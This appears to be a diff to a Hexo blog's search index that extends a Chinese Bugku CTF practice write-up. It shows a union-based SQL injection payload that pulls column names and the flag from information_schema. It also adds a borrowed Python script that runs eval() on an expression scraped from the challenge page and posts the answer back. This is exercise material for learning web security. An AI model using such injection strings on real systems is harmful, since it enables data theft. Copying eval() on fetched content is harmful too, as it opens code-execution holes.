@@ -157,6 +157,7 @@ ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
     <url>/2020/09/06/bugku1-10/</url>
     <content><![CDATA[<h1 id="bugku刷题记录1"><a href="#bugku刷题记录1" class="headerlink" title="bugku刷题记录1"></a>bugku刷题记录1</h1><a id="more"></a>
 
+<p>[TOC]</p>
 <h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>查看源码即可</p>
 <h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>修改前端代码</p>
 <p><img src="/2020/09/06/bugku1-10/%E8%AE%A1%E7%AE%97%E5%99%A8.png" alt></p>
@@ -284,7 +285,8 @@ s214587387a</code></pre><p><img src="/2020/09/06/bugku1-10/%E5%A4%87%E4%BB%BD.pn
 <h3 id="4-字段名"><a href="#4-字段名" class="headerlink" title="4.字段名"></a>4.字段名</h3><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #</code></pre><p> skctf_flag</p>
 <p> 得到flag</p>
 <p> <code>(select skctf_flag from skctf_flag.fl4g)</code></p>
-]]></content>
+<h2 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h2><p>看到题目就知道需要用python的脚本来做（菜鸡不配），网上找的脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/qiumingshan/'</span></span><br><span class="line">r=requests.session()</span><br><span class="line">requestpage = r.get(url)</span><br><span class="line">ans=re.findall(<span class="string">'&lt;div&gt;(.*?)=?;&lt;/div&gt;'</span>,requestpage.text)<span class="comment">#获取表达式，我正则写的好像有点问题，多匹配了最后的=?两个字符</span></span><br><span class="line">ans=<span class="string">""</span>.join(ans)<span class="comment">#列表转为字符串</span></span><br><span class="line">ans=ans[:<span class="number">-2</span>]<span class="comment">#去掉最后的=?</span></span><br><span class="line">post=eval(ans)<span class="comment">#计算表达式的值</span></span><br><span class="line">data=&#123;<span class="string">'value'</span>:post&#125;<span class="comment">#构造post的data部分</span></span><br><span class="line">flag=r.post(url,data=data)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>ctf</category>
       </categories>
@@ -294,6 +296,7 @@ s214587387a</code></pre><p><img src="/2020/09/06/bugku1-10/%E5%A4%87%E4%BB%BD.pn
         <tag>域名解析</tag>
         <tag>md5</tag>
         <tag>爆破</tag>
+        <tag>脚本</tag>
       </tags>
   </entry>
   <entry>
@@ -702,5 +705,8 @@ E#---
     <title>bugku1</title>
     <url>/2020/09/10/bugku1/</url>
     <content><![CDATA[]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
   </entry>
 </search>
